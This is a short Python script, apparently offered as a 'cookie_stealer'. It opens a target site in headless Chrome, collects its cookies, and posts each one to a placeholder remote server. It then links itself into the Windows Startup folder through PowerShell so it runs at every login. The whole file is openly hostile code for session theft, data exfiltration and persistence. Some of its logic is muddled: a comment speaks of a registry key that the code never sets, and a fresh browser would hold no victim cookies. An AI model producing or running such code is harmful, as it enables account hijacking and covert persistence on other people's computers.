import requests
from selenium import webdriver
from selenium.webdriver.common.by import By
from selenium.webdriver.chrome.service import Service
from webdriver_manager.chrome import ChromeDriverManager
import os
import subprocess

# Function to send captured data to a remote server
def send_data(data):
    url = 'http://yourserver.com/capture'  # Replace with your server URL
    response = requests.post(url, data={'data': data})
    if response.status_code == 200:
        print("Data sent successfully")
    else:
        print("Failed to send data")

# Function to capture session cookies
def capture_cookies():
    # Set up the Selenium WebDriver
    options = webdriver.ChromeOptions()
    options.add_argument('--headless')  # Run headless Chrome
    driver = webdriver.Chrome(service=Service(ChromeDriverManager().install()), options=options)

    # Open the target website
    driver.get('http://example.com')  # Replace with the target website

    # Wait for the page to load and cookies to be set
    driver.implicitly_wait(10)

    # Get the cookies
    cookies = driver.get_cookies()

    # Close the browser
    driver.quit()

    # Send the cookies to the server
    for cookie in cookies:
        send_data(cookie)

# Function to add a registry key to run the script at startup
def add_to_startup():
    startup_path = os.path.join(os.environ['APPDATA'], 'Microsoft', 'Windows', 'Start Menu', 'Programs', 'Startup')
    target_path = os.path.abspath('cookie_stealer.py')
    target_shortcut = os.path.join(startup_path, 'cookie_stealer.lnk')
    subprocess.run(['powershell', '-Command', f'New-Item -Path {startup_path} -Name "cookie_stealer.lnk" -ItemType SymbolicLink -Target {target_path}'], shell=True)

if __name__ == "__main__":
    capture_cookies()
    add_to_startup()